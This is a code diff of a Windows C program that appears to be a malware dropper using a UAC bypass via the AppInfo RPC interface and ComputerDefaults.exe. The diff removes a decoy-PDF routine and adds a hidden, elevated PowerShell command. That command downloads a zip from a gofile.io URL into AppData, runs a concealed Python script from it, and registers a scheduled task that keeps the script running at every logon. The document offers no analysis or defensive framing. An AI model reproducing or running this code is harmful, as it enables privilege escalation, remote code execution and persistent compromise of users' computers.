@@ -3,16 +3,12 @@
 #include <rpc.h>
 #include <rpcndr.h>
 #include <shlwapi.h>
-#include <shellapi.h>
-#include <wincrypt.h>
 
 #pragma comment(lib, "rpcrt4.lib")
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "crypt32.lib")
-
 
 // --- Constants & Typedefs ---
 #define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
@@ -21,7 +17,7 @@
 #define COMPUTERDEFAULTS_EXE L"\\ComputerDefaults.exe"
 #define ProcessDebugObjectHandle 30
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
-const char* pdf_base64 = "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Pj4KZW5kb2JqCjEgMCBvYmoKPDwgL1R5cGUgL09DRyAvTmFtZSAoTUFUQ0FUKQo+PgplbmRvYmoKMiAwIG9iago8PCAvVHlwZSAvT0NHIC9OYW1lIChMaWVuX0RhbSkKPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL09DRyAvTmFtZSAoQU1fNykKPj4KZW5kb2JqCjkgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCA4IDAgUiAvTWVkaWFCb3ggWzAgMCA1OTUgODQyXSAvQ29udGVudHMgWzYgMCBSCl0gL0Fubm90cyBbNCAwIFIgNSAwIFIgXSAvUm90YXRlIDI3MCAKIC9WUCBbCjw8ICAvTWVhc3VyZQo8PCAgL1N1YnR5cGUgL1JMCiAvQSBbCjw8ICAvQyAxIC9VICggKQo+Pl0KIC9EIFsKPDwgIC9DIDEgL1UgKCApCj4+XQogL1ggWwo8PCAgL0MgMC4xNTUwNCAvVSAoICkKPj5dCiAvUiAoICkgL1R5cGUgL01lYXN1cmUKPj4gL1R5cGUgL1ZpZXdwb3J0IC9CQm94IFs0OCAwIDU0NiA4NDFdCj4+XSAvUmVzb3VyY2VzCjw8ICAvUHJvY1NldCBbIC9QREZdCiAvRXh0R1N0YXRlCjw8ICAvR1QyNTUgNyAwIFIKPj4KIC9Qcm9wZXJ0aWVzCjw8ICAvb2MxIDEgMCBSIC9vYzIgMiAwIFIgL29jMyAzIDAgUgo+Pgo+Pgo+PgplbmRvYmoKOCAwIG9iago8PCAvVHlwZSAvUGFnZXMgL0tpZHMgWzkgMCBSCl0gL0NvdW50IDEKPj4KZW5kb2JqCjQgMCBvYmoKCjw8ICAvU3VidHlwZSAvU3F1YXJlIC9SZWN0IFs0NDUgNDcgNDIwIDEzM10gL1QgKEF1dG9DQUQgU0hYIFRleHQpIC9GIDY0IC9Db250ZW50cyA8ZmVmZjAwMzEwMDM3MDAyMDAwNzIwMGUzMDA2ZTAwNjg+IC9Cb3JkZXIgWzAgMCAwXQo+PgplbmRvYmoKNSAwIG9iagoKPDwgIC9TdWJ0eXBlIC9TcXVhcmUgL1JlY3QgWzQzMSA0NzIgNDAwIDU0OV0gL1QgKEF1dG9DQUQgU0hYIFRleHQpIC9GIDY0IC9Db250ZW50cyA8ZmVmZjAwMzEwMDM2MDAyMDAwNjcwMGUyMDA2ZT4gL0JvcmRlciBbMCAwIDBdCj4+CmVuZG9iagoxMCAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgOCAwIFIgL09DUHJvcGVydGllcwo8PCAgL09DR3MgWyAxIDAgUiAyIDAgUiAzIDAgUl0gIC9ECjw8ICAvT3JkZXIgWyAzIDAgUiAyIDAgUiAxIDAgUl0gL09GRiBbXQo+Pgo+PiAvUGFnZU1vZGUgL1VzZU9DIC9QYWdlTGF5b3V0IC9TaW5nbGVQYWdlIC9QYWdlTGFiZWxzCjw8ICAvTnVtcyBbMAo8PCAgL1AgPGZlZmYwMDViMDAzMTAwNWQwMDIwMDA0ZDAwNmYwMDY0MDA2NTAwNmM+Cj4+XQo+PiAvUGFnZU1vZGUgL1VzZU91dGxpbmVzIC9PdXRsaW5lcyAxMSAwIFIKPj4KZW5kb2JqCjEzIDAgb2JqCjw8ICAvVGl0bGUgPGZlZmYwMDRkMDA2ZjAwNjQwMDY1MDA2Yz4gIC9QYXJlbnQgMTIgMCBSIC9EZXN0IFs5IDAgUiAgL0ZpdF0KPj4KZW5kb2JqCjEyIDAgb2JqCjw8ICAvVGl0bGUgPGZlZmYwMDUzMDA2ODAwNjUwMDY1MDA3NDAwNzMwMDIwMDA2MTAwNmUwMDY0MDAyMDAwNTYwMDY5MDA2NTAwNzcwMDczPiAgL1BhcmVudCAxMSAwIFIgL0NvdW50IDEgL0ZpcnN0IDEzIDAgUiAvTGFzdCAxMyAwIFIKPj4KZW5kb2JqCjExIDAgb2JqCjw8IC9UeXBlIC9PdXRsaW5lcyAvQ291bnQgMSAvRmlyc3QgMTIgMCBSIC9MYXN0IDEyIDAgUgo+PgplbmRvYmoKMTQgMCBvYmoKPDwgIC9DcmVhdG9yIChBdXRvQ0FEIE1lY2hhbmljYWwgMjAyMiAtIEVuZ2xpc2ggMjAyMiBcKDI0LjFzIFwoTE1TIFRlY2hcKVwpKSAvVGl0bGUgKE1vZGVsKSAvUHJvZHVjZXIgKHBkZnBsb3QxNi5oZGkgMTYuMDEuMDUxLjAwMDAwKSAvQ3JlYXRpb25EYXRlIChEOjIwMjQwOTE2MDczNjU0KSAvTW9kRGF0ZSAoRDoyMDI0MDkxNjA3MzY1NCkKPj4KZW5kb2JqCnhyZWYKMCAxNQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDM2MTAgMDAwMDAgbiAKMDAwMDAwMzY1NyAwMDAwMCBuIAowMDAwMDAzNzA2IDAwMDAwIG4gCjAwMDAwMDQyNDMgMDAwMDAgbiAKMDAwMDAwNDM5NSAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDM1MzYgMDAwMDAgbiAKMDAwMDAwNDE4NSAwMDAwMCBuIAowMDAwMDAzNzUxIDAwMDAwIG4gCjAwMDAwMDQ1NDQgMDAwMDAgbiAKMDAwMDAwNTA5OCAwMDAwMCBuIAowMDAwMDA0OTQ1IDAwMDAwIG4gCjAwMDAwMDQ4NTIgMDAwMDAgbiAKMDAwMDAwNTE3MiAwMDAwMCBuIAp0cmFpbGVyCjw8ICAvU2l6ZSAxNSAvUm9vdCAxMCAwIFIgL0luZm8gMTQgMCBSCj4+CnN0YXJ0eHJlZgo1Mzg2CiUlRU9GDQ==";
+
 typedef LONG NTSTATUS;
 typedef struct _UC_CONTEXT {
     WCHAR szSystemDirectory[MAX_PATH + 1];
@@ -155,7 +151,7 @@ int main() {
 
     // 4. BUILD COMMAND
     swprintf_s(weaponizedCmd, 2048, 
-        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$w=New-Object -ComObject WScript.Shell;Start-Process notepad;Start-Sleep -Milliseconds 500;$w.SendKeys('hack')\"");
+        L"powershell -WindowStyle Hidden -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $zipPath=\\\"$env:USERPROFILE\\AppData\\Roaming\\Word.zip\\\"; $extractPath=\\\"$env:USERPROFILE\\AppData\\Roaming\\Word\\\"; (New-Object System.Net.WebClient).DownloadFile(\\\"https://store-na-phx-3.gofile.io/download/web/6b361493-3ce6-4ab5-976b-9af4166cd1b6/office.zip\\\", $zipPath); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath); Remove-Item $zipPath -Force; Start-Process \\\"$extractPath\\python.exe\\\" -ArgumentList \\\"$extractPath\\Lib\\system.py\\\" -WindowStyle Hidden; schtasks /create /tn \\\"ActiveOffice\\\" /tr \\\"\\\"$extractPath\\pythonw.exe\\\" \\\"$extractPath\\Lib\\system.py\\\"\\\" /sc onlogon /delay 0005:00 /rl highest /f\"'");
 
     printf("[DEBUG] Target: %ws\n", targetPath);
     printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);
@@ -226,73 +222,7 @@ int main() {
     printf("--- DONE ---\n");
     return 0;
 }
-
-
-BOOL SaveBase64ToPdf(const char* b64, const wchar_t* outPath)
-{
-    DWORD needed = 0;
-
-    if (!CryptStringToBinaryA(
-        b64,
-        0,
-        CRYPT_STRING_BASE64,
-        NULL,
-        &needed,
-        NULL,
-        NULL))
-    {
-        return FALSE;
-    }
-
-    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, needed);
-    if (!buffer)
-        return FALSE;
-
-    if (!CryptStringToBinaryA(
-        b64,
-        0,
-        CRYPT_STRING_BASE64,
-        buffer,
-        &needed,
-        NULL,
-        NULL))
-    {
-        HeapFree(GetProcessHeap(), 0, buffer);
-        return FALSE;
-    }
-
-    HANDLE hFile = CreateFileW(
-        outPath,
-        GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL);
-
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        HeapFree(GetProcessHeap(), 0, buffer);
-        return FALSE;
-    }
-
-    DWORD written = 0;
-    WriteFile(hFile, buffer, needed, &written, NULL);
-
-    CloseHandle(hFile);
-    HeapFree(GetProcessHeap(), 0, buffer);
-
-    return TRUE;
-}
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
 {
-    wchar_t path[MAX_PATH];
-    GetTempPathW(MAX_PATH, path);
-    wcscat_s(path, MAX_PATH, L"document.pdf");
-
-    if (SaveBase64ToPdf(pdf_base64, path))
-    {
-        ShellExecuteW(NULL, L"open", path, NULL, NULL, SW_SHOW);
-    }
     return main();
 }
